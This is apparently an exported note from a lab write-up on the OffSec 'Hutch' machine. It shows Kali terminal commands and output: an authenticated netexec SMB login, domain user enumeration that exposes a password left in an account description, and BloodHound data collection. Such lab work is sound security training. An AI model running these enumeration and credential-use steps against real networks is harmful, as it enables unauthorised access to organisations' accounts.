+&boxur;&boxh;$ nxc smb 192.168.131.122 -u &apos;fmcsorley&apos; -d hutch.offsec -p &apos;CrabSharkJellyfish192&apos;  
+SMB         192.168.131.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False) 
+SMB         192.168.131.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Hutch]</span>
+&boxur;&boxh;$ nxc smb <span class="hljs-number">192.168</span>.<span class="hljs-number">131.122</span> -u <span class="hljs-string">&apos;fmcsorley&apos;</span> -d hutch<span class="hljs-selector-class">.offsec</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&apos;CrabSharkJellyfish192&apos;</span>  
+SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">131.122</span> <span class="hljs-number">445</span>    HUTCHDC          <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False) 
+SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">131.122</span> <span class="hljs-number">445</span>    HUTCHDC          <span class="hljs-selector-attr">[+]</span> hutch.offsec\fmcsorley:CrabSharkJellyfish192</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
+&boxur;&boxh;$ nxc smb 192.168.131.122 -u &apos;fmcsorley&apos; -d hutch.offsec -p &apos;CrabSharkJellyfish192&apos; --users 
+SMB         192.168.131.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False) 
+SMB         192.168.131.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
+SMB         192.168.131.122 445    HUTCHDC          -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         192.168.131.122 445    HUTCHDC          Administrator                 2026-01-22 21:17:16 11      Built-in account for administering the computer/domain 
+SMB         192.168.131.122 445    HUTCHDC          Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         192.168.131.122 445    HUTCHDC          krbtgt                        2020-11-04 05:26:23 0       Key Distribution Center Service Account 
+SMB         192.168.131.122 445    HUTCHDC          rplacidi                      2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          opatry                        2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          ltaunton                      2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          acostello                     2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          jsparwell                     2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          oknee                         2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          jmckendry                     2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          avictoria                     2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          jfrarey                       2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          eaburrow                      2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          cluddy                        2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          agitthouse                    2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          fmcsorley                     2020-11-04 05:35:05 0       Password set to CrabSharkJellyfish192 at user&apos;s request. Please change on next login. 
+SMB         192.168.131.122 445    HUTCHDC          domainadmin                   2021-02-16 05:24:22 0        
+SMB         192.168.131.122 445    HUTCHDC          [*] Enumerated 17 local users: HUTCH</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
+&boxur;&boxh;$ nxc smb 192.168.131.122 -u &apos;fmcsorley&apos; -d hutch.offsec -p &apos;CrabSharkJellyfish192&apos; --users 
+SMB         192.168.131.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False) 
+SMB         192.168.131.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
+SMB         192.168.131.122 445    HUTCHDC          -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         192.168.131.122 445    HUTCHDC          Administrator                 2026-01-22 21:17:16 11      Built-in account for administering the computer/domain 
+SMB         192.168.131.122 445    HUTCHDC          Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         192.168.131.122 445    HUTCHDC          krbtgt                        2020-11-04 05:26:23 0       Key Distribution Center Service Account 
+SMB         192.168.131.122 445    HUTCHDC          rplacidi                      2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          opatry                        2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          ltaunton                      2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          acostello                     2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          jsparwell                     2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          oknee                         2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          jmckendry                     2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          avictoria                     2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          jfrarey                       2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          eaburrow                      2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          cluddy                        2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          agitthouse                    2020-11-04 05:35:05 0        
+SMB         192.168.131.122 445    HUTCHDC          fmcsorley                     2020-11-04 05:35:05 0       Password set to CrabSharkJellyfish192 at user&apos;s request. Please change on next login. 
+SMB         192.168.131.122 445    HUTCHDC          domainadmin                   2021-02-16 05:24:22 0        
+SMB         192.168.131.122 445    HUTCHDC          [*] Enumerated 17 local users: HUTCH</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
+&boxur;&boxh;$ bloodhound-python -d hutch.offsec -u fmcsorley -p &apos;CrabSharkJellyfish192&apos; -c all -ns 192.168.131.122 
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: hutch.offsec
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (hutchdc.hutch.offsec:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: hutchdc.hutch.offsec
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: hutchdc.hutch.offsec
+INFO: Found 18 users
+INFO: Found 52 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: hutchdc.hutch.offsec
+INFO: Done in 00M 02S</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
+&boxur;&boxh;$ bloodhound-python -d hutch.offsec -u fmcsorley -p <span class="hljs-comment">&apos;CrabSharkJellyfish192&apos; -c all -ns 192.168.131.122 </span>
+<span class="hljs-symbol">INFO:</span> BloodHound.py <span class="hljs-keyword">for</span> BloodHound LEGACY (BloodHound <span class="hljs-number">4.2</span> <span class="hljs-built_in">and</span> <span class="hljs-number">4.3</span>)
+<span class="hljs-symbol">INFO:</span> Found AD domain: hutch.offsec
+<span class="hljs-symbol">INFO:</span> Getting TGT <span class="hljs-keyword">for</span> user
+<span class="hljs-symbol">WARNING:</span> Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> Kerberos TGT. Falling back <span class="hljs-keyword">to</span> NTLM authentication. <span class="hljs-keyword">Error</span>: [Errno Connection <span class="hljs-keyword">error</span> (hutchdc.hutch.offsec:<span class="hljs-number">88</span>)] [Errno -<span class="hljs-number">2</span>] Name <span class="hljs-built_in">or</span> service <span class="hljs-built_in">not</span> known
+<span class="hljs-symbol">INFO:</span> Connecting <span class="hljs-keyword">to</span> LDAP server: hutchdc.hutch.offsec
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> domains
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> domains <span class="hljs-keyword">in</span> the forest
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> computers
+<span class="hljs-symbol">INFO:</span> Connecting <span class="hljs-keyword">to</span> LDAP server: hutchdc.hutch.offsec
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">18</span> users
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">52</span> groups
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">2</span> gpos
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> ous
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">19</span> containers
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">0</span> trusts
+<span class="hljs-symbol">INFO:</span> Starting computer enumeration <span class="hljs-keyword">with</span> <span class="hljs-number">10</span> workers
+<span class="hljs-symbol">INFO:</span> Querying computer: hutchdc.hutch.offsec
+<span class="hljs-symbol">INFO:</span> Done <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>M <span class="hljs-number">02S</span></code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
+&boxur;&boxh;$ bloodhound-python -d hutch.offsec -u fmcsorley -p &apos;CrabSharkJellyfish192&apos; -c all -ns 192.168.131.122 
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: hutch.offsec
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (hutchdc.hutch.offsec:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: hutchdc.hutch.offsec
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: hutchdc.hutch.offsec
+INFO: Found 18 users
+INFO: Found 52 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: hutchdc.hutch.offsec
+INFO: Done in 00M 02S</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
+&boxur;&boxh;$ bloodhound-python -d hutch.offsec -u fmcsorley -p <span class="hljs-comment">&apos;CrabSharkJellyfish192&apos; -c all -ns 192.168.131.122 </span>
+<span class="hljs-symbol">INFO:</span> BloodHound.py <span class="hljs-keyword">for</span> BloodHound LEGACY (BloodHound <span class="hljs-number">4.2</span> <span class="hljs-built_in">and</span> <span class="hljs-number">4.3</span>)
+<span class="hljs-symbol">INFO:</span> Found AD domain: hutch.offsec
+<span class="hljs-symbol">INFO:</span> Getting TGT <span class="hljs-keyword">for</span> user
+<span class="hljs-symbol">WARNING:</span> Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> Kerberos TGT. Falling back <span class="hljs-keyword">to</span> NTLM authentication. <span class="hljs-keyword">Error</span>: [Errno Connection <span class="hljs-keyword">error</span> (hutchdc.hutch.offsec:<span class="hljs-number">88</span>)] [Errno -<span class="hljs-number">2</span>] Name <span class="hljs-built_in">or</span> service <span class="hljs-built_in">not</span> known
+<span class="hljs-symbol">INFO:</span> Connecting <span class="hljs-keyword">to</span> LDAP server: hutchdc.hutch.offsec
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> domains
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> domains <span class="hljs-keyword">in</span> the forest
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> computers
+<span class="hljs-symbol">INFO:</span> Connecting <span class="hljs-keyword">to</span> LDAP server: hutchdc.hutch.offsec
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">18</span> users
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">52</span> groups
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">2</span> gpos
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> ous
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">19</span> containers
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">0</span> trusts
+<span class="hljs-symbol">INFO:</span> Starting computer enumeration <span class="hljs-keyword">with</span> <span class="hljs-number">10</span> workers
+<span class="hljs-symbol">INFO:</span> Querying computer: hutchdc.hutch.offsec
+<span class="hljs-symbol">INFO:</span> Done <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>M <span class="hljs-number">02S</span></code></pre></div>
+<p><img src="data:image/png;base64,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